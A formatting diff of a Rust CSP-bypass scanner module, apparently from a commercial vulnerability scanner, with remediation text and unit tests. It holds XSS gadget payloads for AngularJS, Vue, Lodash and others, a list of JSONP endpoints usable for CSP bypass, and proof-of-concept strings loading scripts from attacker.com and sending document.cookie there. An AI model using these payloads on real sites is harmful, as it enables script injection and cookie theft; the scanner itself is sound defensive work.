@@ -18,7 +18,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::HttpClient;
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
@@ -31,12 +30,18 @@ use tracing::{debug, info};
 /// Known JSONP endpoints that can be used for CSP bypass
 const KNOWN_JSONP_ENDPOINTS: &[(&str, &str)] = &[
     // Google
-    ("www.google.com", "/complete/search?client=chrome&q=test&callback="),
+    (
+        "www.google.com",
+        "/complete/search?client=chrome&q=test&callback=",
+    ),
     ("accounts.google.com", "/o/oauth2/revoke?callback="),
     ("www.googleapis.com", "/customsearch/v1?callback="),
     ("maps.googleapis.com", "/maps/api/js?callback="),
     // CDN
-    ("cdnjs.cloudflare.com", "/ajax/libs/angular.js/1.6.0/angular.min.js"),
+    (
+        "cdnjs.cloudflare.com",
+        "/ajax/libs/angular.js/1.6.0/angular.min.js",
+    ),
     ("cdn.jsdelivr.net", "/npm/angular@1.6.0/angular.min.js"),
     ("unpkg.com", "/angular@1.6.0/angular.min.js"),
     // Social
@@ -47,23 +52,57 @@ const KNOWN_JSONP_ENDPOINTS: &[(&str, &str)] = &[
     ("www.google-analytics.com", "/analytics.js"),
     ("www.googletagmanager.com", "/gtag/js"),
     // Others
-    ("api.flickr.com", "/services/feeds/photos_public.gne?jsoncallback="),
-    ("en.wikipedia.org", "/w/api.php?action=query&format=json&callback="),
+    (
+        "api.flickr.com",
+        "/services/feeds/photos_public.gne?jsoncallback=",
+    ),
+    (
+        "en.wikipedia.org",
+        "/w/api.php?action=query&format=json&callback=",
+    ),
 ];
 
 /// Known script gadgets in popular libraries
 const KNOWN_SCRIPT_GADGETS: &[(&str, &str, &str)] = &[
     // Library, indicator pattern, gadget payload
-    ("AngularJS 1.x", "ng-app", "{{constructor.constructor('alert(1)')()}}"),
-    ("AngularJS (sandbox bypass)", "angular.min.js", "{{$on.constructor('alert(1)')()}}"),
+    (
+        "AngularJS 1.x",
+        "ng-app",
+        "{{constructor.constructor('alert(1)')()}}",
+    ),
+    (
+        "AngularJS (sandbox bypass)",
+        "angular.min.js",
+        "{{$on.constructor('alert(1)')()}}",
+    ),
     ("Vue.js 2.x", "Vue(", "{{_c.constructor('alert(1)')()}}"),
-    ("Knockout.js", "ko.applyBindings", "data-bind=\"template: {afterRender: alert}\""),
-    ("RequireJS", "require.config", "require(['data:text/javascript,alert(1)'])"),
+    (
+        "Knockout.js",
+        "ko.applyBindings",
+        "data-bind=\"template: {afterRender: alert}\"",
+    ),
+    (
+        "RequireJS",
+        "require.config",
+        "require(['data:text/javascript,alert(1)'])",
+    ),
     ("Ember.js", "Ember.Application", "{{action \"alert\" 1}}"),
-    ("Lodash", "_.template", "_.template('<%= constructor.constructor(\"alert(1)\")() %>')"),
+    (
+        "Lodash",
+        "_.template",
+        "_.template('<%= constructor.constructor(\"alert(1)\")() %>')",
+    ),
     ("jQuery", "$.parseHTML", "<img src=x onerror=alert(1)>"),
-    ("DOMPurify (bypass)", "DOMPurify", "<math><mtext><option><style><mglyph>"),
-    ("Google Closure", "goog.require", "goog.require('goog.string');goog.string.htmlEscape=alert"),
+    (
+        "DOMPurify (bypass)",
+        "DOMPurify",
+        "<math><mtext><option><style><mglyph>",
+    ),
+    (
+        "Google Closure",
+        "goog.require",
+        "goog.require('goog.string');goog.string.htmlEscape=alert",
+    ),
 ];
 
 /// CSP directive types
@@ -205,11 +244,15 @@ impl CspDirective {
                 "'strict-dynamic'" => self.has_strict_dynamic = true,
                 _ if v.starts_with("'nonce-") => {
                     self.has_nonce = true;
-                    if let Some(nonce) = v.strip_prefix("'nonce-").and_then(|s| s.strip_suffix("'")) {
+                    if let Some(nonce) = v.strip_prefix("'nonce-").and_then(|s| s.strip_suffix("'"))
+                    {
                         self.nonces.push(nonce.to_string());
                     }
                 }
-                _ if v.starts_with("'sha256-") || v.starts_with("'sha384-") || v.starts_with("'sha512-") => {
+                _ if v.starts_with("'sha256-")
+                    || v.starts_with("'sha384-")
+                    || v.starts_with("'sha512-") =>
+                {
                     self.has_hash = true;
                     self.hashes.push(v.to_string());
                 }
@@ -294,13 +337,15 @@ impl ParsedCsp {
 
     /// Get effective script sources (script-src or default-src fallback)
     fn get_script_sources(&self) -> Option<&CspDirective> {
-        self.directives.get("script-src")
+        self.directives
+            .get("script-src")
             .or_else(|| self.directives.get("default-src"))
     }
 
     /// Get effective object sources
     fn get_object_sources(&self) -> Option<&CspDirective> {
-        self.directives.get("object-src")
+        self.directives
+            .get("object-src")
             .or_else(|| self.directives.get("default-src"))
     }
 }
@@ -381,80 +426,136 @@ impl CspBypassScanner {
             // Report-only mode is weaker
             if csp.is_report_only {
                 tests_run += 1;
-                vulnerabilities.push(self.create_vulnerability(
-                    url,
-                    CspBypass {
-                        bypass_type: "CSP Report-Only Mode".to_string(),
-                        severity: Severity::Medium,
-                        description: "CSP is in report-only mode and does not enforce restrictions. \
-                            Malicious scripts will execute and only be reported.".to_string(),
-                        poc: None,
-                        affected_directive: "Content-Security-Policy-Report-Only".to_string(),
-                        cwe: "CWE-1021".to_string(),
-                        remediation: "Change from Content-Security-Policy-Report-Only to \
-                            Content-Security-Policy header to enforce the policy.".to_string(),
-                    },
-                ));
+                vulnerabilities.push(
+                    self.create_vulnerability(
+                        url,
+                        CspBypass {
+                            bypass_type: "CSP Report-Only Mode".to_string(),
+                            severity: Severity::Medium,
+                            description:
+                                "CSP is in report-only mode and does not enforce restrictions. \
+                            Malicious scripts will execute and only be reported."
+                                    .to_string(),
+                            poc: None,
+                            affected_directive: "Content-Security-Policy-Report-Only".to_string(),
+                            cwe: "CWE-1021".to_string(),
+                            remediation: "Change from Content-Security-Policy-Report-Only to \
+                            Content-Security-Policy header to enforce the policy."
+                                .to_string(),
+                        },
+                    ),
+                );
             }
 
             // Check for unsafe-inline bypass
             let (inline_vulns, inline_tests) = self.check_unsafe_inline_bypass(url, csp);
-            vulnerabilities.extend(inline_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                inline_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += inline_tests;
 
             // Check for unsafe-eval bypass
             let (eval_vulns, eval_tests) = self.check_unsafe_eval_bypass(url, csp);
-            vulnerabilities.extend(eval_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                eval_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += eval_tests;
 
             // Check nonce/hash weaknesses
-            let (nonce_vulns, nonce_tests) = self.check_nonce_hash_bypass(url, csp, &response.body).await?;
-            vulnerabilities.extend(nonce_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            let (nonce_vulns, nonce_tests) = self
+                .check_nonce_hash_bypass(url, csp, &response.body)
+                .await?;
+            vulnerabilities.extend(
+                nonce_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += nonce_tests;
 
             // Check wildcard bypass
             let (wildcard_vulns, wildcard_tests) = self.check_wildcard_bypass(url, csp);
-            vulnerabilities.extend(wildcard_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                wildcard_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += wildcard_tests;
 
             // Check JSONP bypass
             let (jsonp_vulns, jsonp_tests) = self.check_jsonp_bypass(url, csp).await?;
-            vulnerabilities.extend(jsonp_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                jsonp_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += jsonp_tests;
 
             // Check Angular bypass
-            let (angular_vulns, angular_tests) = self.check_angular_bypass(url, csp, &response.body);
-            vulnerabilities.extend(angular_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            let (angular_vulns, angular_tests) =
+                self.check_angular_bypass(url, csp, &response.body);
+            vulnerabilities.extend(
+                angular_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += angular_tests;
 
             // Check base-uri bypass
             let (base_vulns, base_tests) = self.check_base_uri_bypass(url, csp);
-            vulnerabilities.extend(base_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                base_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += base_tests;
 
             // Check form-action bypass (dangling markup)
             let (form_vulns, form_tests) = self.check_form_action_bypass(url, csp);
-            vulnerabilities.extend(form_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                form_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += form_tests;
 
             // Check script gadgets
             let (gadget_vulns, gadget_tests) = self.check_script_gadgets(url, csp, &response.body);
-            vulnerabilities.extend(gadget_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                gadget_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += gadget_tests;
 
             // Check missing directives
             let (missing_vulns, missing_tests) = self.check_missing_directives(url, csp);
-            vulnerabilities.extend(missing_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                missing_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += missing_tests;
 
             // Check object-src bypass
             let (object_vulns, object_tests) = self.check_object_src_bypass(url, csp);
-            vulnerabilities.extend(object_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                object_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += object_tests;
 
             // Check data: URI bypass
             let (data_vulns, data_tests) = self.check_data_uri_bypass(url, csp);
-            vulnerabilities.extend(data_vulns.into_iter().map(|b| self.create_vulnerability(url, b)));
+            vulnerabilities.extend(
+                data_vulns
+                    .into_iter()
+                    .map(|b| self.create_vulnerability(url, b)),
+            );
             tests_run += data_tests;
         }
 
@@ -578,7 +679,9 @@ impl CspBypassScanner {
                             poc: None,
                             affected_directive: "script-src".to_string(),
                             cwe: "CWE-330".to_string(),
-                            remediation: "Use cryptographically random nonces of at least 128 bits.".to_string(),
+                            remediation:
+                                "Use cryptographically random nonces of at least 128 bits."
+                                    .to_string(),
                         });
                     }
 
@@ -596,7 +699,8 @@ impl CspBypassScanner {
                             affected_directive: "script-src".to_string(),
                             cwe: "CWE-330".to_string(),
                             remediation: "Generate nonces using a cryptographically secure random \
-                                number generator (CSPRNG) for each request.".to_string(),
+                                number generator (CSPRNG) for each request."
+                                .to_string(),
                         });
                     }
                 }
@@ -615,15 +719,19 @@ impl CspBypassScanner {
                                 bypasses.push(CspBypass {
                                     bypass_type: "Nonce Reuse".to_string(),
                                     severity: Severity::Critical,
-                                    description: "CSP nonce is reused across requests. This allows \
-                                        attackers to inject scripts using the known nonce value.".to_string(),
+                                    description:
+                                        "CSP nonce is reused across requests. This allows \
+                                        attackers to inject scripts using the known nonce value."
+                                            .to_string(),
                                     poc: Some(format!(
                                         "<script nonce=\"{}\">alert('CSP-Bypass')</script>",
                                         script_src.nonces.first().unwrap_or(&String::new())
                                     )),
                                     affected_directive: "script-src".to_string(),
                                     cwe: "CWE-330".to_string(),
-                                    remediation: "Generate a new unique nonce for every HTTP response.".to_string(),
+                                    remediation:
+                                        "Generate a new unique nonce for every HTTP response."
+                                            .to_string(),
                                 });
                             }
                         }
@@ -666,11 +774,13 @@ impl CspBypassScanner {
                             bypass_type: "Weak Hash Algorithm (SHA-1)".to_string(),
                             severity: Severity::Low,
                             description: "CSP uses SHA-1 hash which is cryptographically weak. \
-                                While not directly exploitable, sha256 or sha384 is recommended.".to_string(),
+                                While not directly exploitable, sha256 or sha384 is recommended."
+                                .to_string(),
                             poc: None,
                             affected_directive: "script-src".to_string(),
                             cwe: "CWE-328".to_string(),
-                            remediation: "Use sha256, sha384, or sha512 for CSP hashes.".to_string(),
+                            remediation: "Use sha256, sha384, or sha512 for CSP hashes."
+                                .to_string(),
                         });
                     }
                 }
@@ -694,11 +804,13 @@ impl CspBypassScanner {
                     bypass_type: "Wildcard Script Source".to_string(),
                     severity: Severity::Critical,
                     description: "CSP script-src contains '*', allowing scripts from any domain. \
-                        This provides no protection against XSS.".to_string(),
+                        This provides no protection against XSS."
+                        .to_string(),
                     poc: Some("<script src='https://attacker.com/evil.js'></script>".to_string()),
                     affected_directive: "script-src".to_string(),
                     cwe: "CWE-79".to_string(),
-                    remediation: "Remove '*' and specify only trusted domains explicitly.".to_string(),
+                    remediation: "Remove '*' and specify only trusted domains explicitly."
+                        .to_string(),
                 });
             }
 
@@ -793,7 +905,8 @@ impl CspBypassScanner {
 
                         // Try to verify the JSONP endpoint works
                         let jsonp_url = format!("https://{}{}alert", jsonp_domain, jsonp_path);
-                        let verified = if let Ok(response) = self.http_client.get(&jsonp_url).await {
+                        let verified = if let Ok(response) = self.http_client.get(&jsonp_url).await
+                        {
                             response.status_code == 200 && response.body.contains("alert")
                         } else {
                             false
@@ -859,9 +972,9 @@ impl CspBypassScanner {
         let mut tests = 0;
 
         // Check if Angular is loaded
-        let has_angular = body.contains("ng-app") ||
-            body.contains("ng-version") ||
-            body.to_lowercase().contains("angular");
+        let has_angular = body.contains("ng-app")
+            || body.contains("ng-version")
+            || body.to_lowercase().contains("angular");
 
         if !has_angular {
             return (bypasses, 0);
@@ -885,9 +998,9 @@ impl CspBypassScanner {
                         tests += 1;
 
                         // Determine Angular version from body
-                        let is_angular_1 = body.contains("ng-app") ||
-                            body.contains("angular.min.js") ||
-                            body.contains("angular.js");
+                        let is_angular_1 = body.contains("ng-app")
+                            || body.contains("angular.min.js")
+                            || body.contains("angular.js");
 
                         let poc = if is_angular_1 {
                             // AngularJS 1.x sandbox bypass
@@ -924,12 +1037,17 @@ impl CspBypassScanner {
                 bypass_type: "Angular ng-app Present".to_string(),
                 severity: Severity::Medium,
                 description: "Page has ng-app directive. If Angular is loaded and attacker can \
-                    inject into the DOM, template expressions will be evaluated.".to_string(),
-                poc: Some("<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>".to_string()),
+                    inject into the DOM, template expressions will be evaluated."
+                    .to_string(),
+                poc: Some(
+                    "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"
+                        .to_string(),
+                ),
                 affected_directive: "script-src".to_string(),
                 cwe: "CWE-79".to_string(),
                 remediation: "Ensure user input cannot create new ng-app contexts. \
-                    Use strict contextual output encoding.".to_string(),
+                    Use strict contextual output encoding."
+                    .to_string(),
             });
         }
 
@@ -948,7 +1066,8 @@ impl CspBypassScanner {
                 severity: Severity::Medium,
                 description: "CSP does not include base-uri directive. Attackers can inject \
                     <base> tags to hijack relative URLs, potentially stealing credentials or \
-                    loading malicious scripts.".to_string(),
+                    loading malicious scripts."
+                    .to_string(),
                 poc: Some("<base href='https://attacker.com/'>".to_string()),
                 affected_directive: "base-uri".to_string(),
                 cwe: "CWE-79".to_string(),
@@ -959,7 +1078,8 @@ impl CspBypassScanner {
                 bypasses.push(CspBypass {
                     bypass_type: "Permissive base-uri".to_string(),
                     severity: Severity::Medium,
-                    description: "CSP base-uri allows any origin, enabling <base> tag injection.".to_string(),
+                    description: "CSP base-uri allows any origin, enabling <base> tag injection."
+                        .to_string(),
                     poc: Some("<base href='https://attacker.com/'>".to_string()),
                     affected_directive: "base-uri".to_string(),
                     cwe: "CWE-79".to_string(),
@@ -1022,11 +1142,11 @@ impl CspBypassScanner {
                 // Check if the library's CDN is whitelisted
                 let library_allowed = if let Some(script_src) = csp.get_script_sources() {
                     script_src.domains.iter().any(|d| {
-                        d.contains("cdnjs") ||
-                        d.contains("jsdelivr") ||
-                        d.contains("unpkg") ||
-                        d.contains("googleapis") ||
-                        d.contains("*")
+                        d.contains("cdnjs")
+                            || d.contains("jsdelivr")
+                            || d.contains("unpkg")
+                            || d.contains("googleapis")
+                            || d.contains("*")
                     }) || script_src.has_wildcard
                 } else {
                     false
@@ -1069,7 +1189,8 @@ impl CspBypassScanner {
                 bypass_type: "Missing object-src Directive".to_string(),
                 severity: Severity::Medium,
                 description: "CSP does not restrict object-src (and no default-src fallback). \
-                    Attackers may be able to embed Flash or other plugins for XSS.".to_string(),
+                    Attackers may be able to embed Flash or other plugins for XSS."
+                    .to_string(),
                 poc: Some("<object data='https://attacker.com/evil.swf'></object>".to_string()),
                 affected_directive: "object-src".to_string(),
                 cwe: "CWE-79".to_string(),
@@ -1084,7 +1205,8 @@ impl CspBypassScanner {
                 bypass_type: "Missing script-src Directive".to_string(),
                 severity: Severity::High,
                 description: "CSP does not include script-src or default-src. \
-                    Scripts can be loaded from any origin.".to_string(),
+                    Scripts can be loaded from any origin."
+                    .to_string(),
                 poc: Some("<script src='https://attacker.com/evil.js'></script>".to_string()),
                 affected_directive: "script-src".to_string(),
                 cwe: "CWE-79".to_string(),
@@ -1100,13 +1222,16 @@ impl CspBypassScanner {
                     bypasses.push(CspBypass {
                         bypass_type: "Wildcard default-src".to_string(),
                         severity: Severity::High,
-                        description: "CSP default-src contains '*'. This provides minimal protection \
-                            as all resource types fall back to allowing any origin.".to_string(),
+                        description:
+                            "CSP default-src contains '*'. This provides minimal protection \
+                            as all resource types fall back to allowing any origin."
+                                .to_string(),
                         poc: None,
                         affected_directive: "default-src".to_string(),
                         cwe: "CWE-1021".to_string(),
                         remediation: "Set restrictive default-src (e.g., 'self') and explicitly \
-                            allow necessary domains in specific directives.".to_string(),
+                            allow necessary domains in specific directives."
+                            .to_string(),
                     });
                 }
             }
@@ -1136,10 +1261,14 @@ impl CspBypassScanner {
                                     some browsers may still support it for attacks.",
                                     cdn
                                 ),
-                                poc: Some(format!("<object data='https://{}/path/evil.swf'></object>", cdn)),
+                                poc: Some(format!(
+                                    "<object data='https://{}/path/evil.swf'></object>",
+                                    cdn
+                                )),
                                 affected_directive: "object-src".to_string(),
                                 cwe: "CWE-79".to_string(),
-                                remediation: "Set object-src 'none' to block all plugins.".to_string(),
+                                remediation: "Set object-src 'none' to block all plugins."
+                                    .to_string(),
                             });
                             break;
                         }
@@ -1185,8 +1314,11 @@ impl CspBypassScanner {
                     bypass_type: "Wildcard img-src".to_string(),
                     severity: Severity::Low,
                     description: "CSP img-src allows any origin. While not directly exploitable \
-                        for XSS, it can be used for data exfiltration via image requests.".to_string(),
-                    poc: Some("<img src='https://attacker.com/log?data=' + document.cookie>".to_string()),
+                        for XSS, it can be used for data exfiltration via image requests."
+                        .to_string(),
+                    poc: Some(
+                        "<img src='https://attacker.com/log?data=' + document.cookie>".to_string(),
+                    ),
                     affected_directive: "img-src".to_string(),
                     cwe: "CWE-200".to_string(),
                     remediation: "Restrict img-src to trusted domains.".to_string(),
@@ -1201,8 +1333,7 @@ impl CspBypassScanner {
     fn is_predictable_nonce(&self, nonce: &str) -> bool {
         // Check for common weak patterns
         let weak_patterns = [
-            "0000", "1111", "1234", "abcd", "test", "nonce",
-            "static", "fixed", "hard", "code",
+            "0000", "1111", "1234", "abcd", "test", "nonce", "static", "fixed", "hard", "code",
         ];
 
         let nonce_lower = nonce.to_lowercase();
@@ -1225,7 +1356,10 @@ impl CspBypassScanner {
         }
 
         // Check if it's all the same character
-        if nonce.chars().all(|c| c == nonce.chars().next().unwrap_or('x')) {
+        if nonce
+            .chars()
+            .all(|c| c == nonce.chars().next().unwrap_or('x'))
+        {
             return true;
         }
 
@@ -1250,7 +1384,11 @@ impl CspBypassScanner {
         let description = format!(
             "{}{}",
             bypass.description,
-            bypass.poc.as_ref().map(|p| format!("\n\nProof of Concept: {}", p)).unwrap_or_default()
+            bypass
+                .poc
+                .as_ref()
+                .map(|p| format!("\n\nProof of Concept: {}", p))
+                .unwrap_or_default()
         );
 
         Vulnerability {
@@ -1270,7 +1408,7 @@ impl CspBypassScanner {
             false_positive: false,
             remediation: bypass.remediation,
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 }
@@ -1348,7 +1486,7 @@ mod tests {
     #[test]
     fn test_predictable_nonce_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         assert!(scanner.is_predictable_nonce("12345678"));
@@ -1361,7 +1499,7 @@ mod tests {
     #[test]
     fn test_missing_directives_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         // CSP with no object-src or default-src
@@ -1370,13 +1508,15 @@ mod tests {
 
         let (bypasses, _) = scanner.check_missing_directives("https://example.com", &parsed);
         assert!(!bypasses.is_empty());
-        assert!(bypasses.iter().any(|b| b.bypass_type.contains("object-src")));
+        assert!(bypasses
+            .iter()
+            .any(|b| b.bypass_type.contains("object-src")));
     }
 
     #[test]
     fn test_unsafe_inline_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         let csp = "script-src 'self' 'unsafe-inline'";
@@ -1384,13 +1524,15 @@ mod tests {
 
         let (bypasses, _) = scanner.check_unsafe_inline_bypass("https://example.com", &parsed);
         assert!(!bypasses.is_empty());
-        assert!(bypasses.iter().any(|b| b.bypass_type.contains("unsafe-inline")));
+        assert!(bypasses
+            .iter()
+            .any(|b| b.bypass_type.contains("unsafe-inline")));
     }
 
     #[test]
     fn test_strict_dynamic_mitigates_unsafe_inline() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         let csp = "script-src 'nonce-abc' 'strict-dynamic' 'unsafe-inline'";
@@ -1398,13 +1540,18 @@ mod tests {
 
         let (bypasses, _) = scanner.check_unsafe_inline_bypass("https://example.com", &parsed);
         // strict-dynamic should mitigate unsafe-inline
-        assert!(bypasses.is_empty() || bypasses.iter().all(|b| !b.bypass_type.contains("unsafe-inline")));
+        assert!(
+            bypasses.is_empty()
+                || bypasses
+                    .iter()
+                    .all(|b| !b.bypass_type.contains("unsafe-inline"))
+        );
     }
 
     #[test]
     fn test_base_uri_bypass_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         // CSP without base-uri
@@ -1419,7 +1566,7 @@ mod tests {
     #[test]
     fn test_data_uri_bypass_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         let csp = "script-src 'self' data:";
@@ -1433,7 +1580,7 @@ mod tests {
     #[test]
     fn test_angular_bypass_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         let csp = "script-src 'self' cdnjs.cloudflare.com";
@@ -1447,7 +1594,7 @@ mod tests {
     #[test]
     fn test_wildcard_cdn_detection() {
         let scanner = CspBypassScanner::new(Arc::new(
-            crate::http_client::HttpClient::new(30, 3).unwrap()
+            crate::http_client::HttpClient::new(30, 3).unwrap(),
         ));
 
         let csp = "script-src 'self' cdn.jsdelivr.net unpkg.com";
